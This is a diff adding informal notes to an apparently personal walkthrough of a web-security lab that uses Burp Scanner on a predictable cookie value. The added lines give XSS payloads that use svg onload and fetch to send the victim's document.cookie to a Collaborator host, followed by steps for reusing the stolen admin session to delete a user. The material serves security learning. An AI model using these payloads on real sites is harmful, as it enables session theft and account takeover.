@@ -37,11 +37,27 @@ To solve the lab, use Burp Scanner's Scan selected insertion point feature to id
 
 <br>
 server said: browser, set this as a session cookie of user.
-if we want to test sth, we want to test sth that is predictable
+if we want to test sth, we want to test sth that is predictable.
+cookies interacts with the database every time the request is send.
 <img width="837" height="678" alt="image" src="https://github.com/user-attachments/assets/8821726f-965e-4626-aaab-fcce57d75bd8" />
 
 <br>
-> audit selected items
+& audit selected items. 
 <img width="555" height="464" alt="image" src="https://github.com/user-attachments/assets/12d547b0-2b8a-4cab-8406-6810891f865a" />
+
+<img width="766" height="680" alt="image" src="https://github.com/user-attachments/assets/6826ebf0-2673-4342-8115-5116637adfed" />
+
+origin payload: ``` '"><svg/onload=fetch`//hcx56jcq7hqqt5jhqarhnd8ab1hw5mtej2asxil7\.oastify.com`> ```
+edit (copy own collab address): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/document.cookie`)> ```
+original cookie was url encoded so document cookie part also must be
+win payload (insert new colab payload): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/${encodeURIComponent(document.cookie)}`)>```
+<img width="833" height="574" alt="image" src="https://github.com/user-attachments/assets/5415eedf-f95a-40dd-8cd1-f7a6bc76c7bb" />
+
+winer
+<img width="1086" height="709" alt="image" src="https://github.com/user-attachments/assets/80f8f0f0-2885-4369-83a1-ecbdb537ad68" />
+<img width="998" height="407" alt="image" src="https://github.com/user-attachments/assets/9d211e67-a926-468d-b303-e30827ea18a9" />
+
+delete cookies except for path / and paste admin (>admin panel>delete carlos)
+
 
 
